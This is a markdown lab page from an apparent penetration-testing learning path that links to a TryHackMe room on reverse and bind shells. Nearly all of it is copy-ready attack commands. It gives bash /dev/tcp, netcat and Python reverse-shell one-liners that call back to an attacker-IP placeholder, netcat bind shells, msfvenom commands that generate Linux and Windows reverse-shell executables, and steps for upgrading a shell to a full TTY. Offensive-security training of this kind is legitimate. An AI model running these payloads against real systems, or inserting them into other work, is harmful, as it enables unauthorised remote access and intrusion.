![Shells Header](https://images.unsplash.com/photo-1544383835-bda2bc66a55d?w=800&h=200&fit=crop)

[🏠 Path Home](Home.md) | [Next Lab ➡️](Lab-02-Easy-Track-Metasploit-Exploitation.md)

---

# Lab 01: Reverse & Bind Shells

---


---


---

---


---

## 🎯 Lab Objective
Understand the difference between bind and reverse shells, and learn how to generate and execute them across multiple platforms.

## 🌐 Direct Lab Access
[![TryHackMe - Shells](https://images.unsplash.com/photo-1516321318423-f06f85e504b3?w=150&h=50&fit=crop)](https://tryhackme.com/room/whattheshell)

---

## 🛠️ Required Tools

| Tool | Purpose |
|------|---------|
| **netcat (nc)** | Setting up listeners and connecting |
| **msfvenom** | Generating payload binaries |
| **python3** | Shell upgrading and execution |

---

## 📝 Step-by-Step Command Guide

### 1. Netcat Listeners (Setting up the receiver)
```bash
# Listen on port 4444 (classic reverse shell listener)
nc -lvnp 4444
```

### 2. Reverse Shell Payloads (Target executes, connects back to you)
```bash
# Bash Reverse Shell
bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1

# Netcat Reverse Shell (if -e is supported)
nc <YOUR_IP> 4444 -e /bin/bash

# Python Reverse Shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

### 3. Bind Shells (Target listens, you connect to target)
```bash
# Target starts bind listener (e.g. port 5555)
nc -lvnp 5555 -e /bin/bash

# Attacker connects to target
nc <TARGET_IP> 5555
```

### 4. Msfvenom Shell Generation
```bash
# Linux ELF Reverse Shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f elf > shell.elf

# Windows EXE Reverse Shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f exe > shell.exe
```

### 5. Upgrading Simple Shells
Once connected, upgrade to a fully interactive TTY.
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z (backgrounds shell)
stty raw -echo; fg
# Press Enter twice
export TERM=xterm
```

---

## 📊 Expected Results
- Establish fully interactive remote shell access back to your handler.
- Verify user permissions with `whoami`.

---

[🏠 Path Home](Home.md) | [Next Lab ➡️](Lab-02-Easy-Track-Metasploit-Exploitation.md)
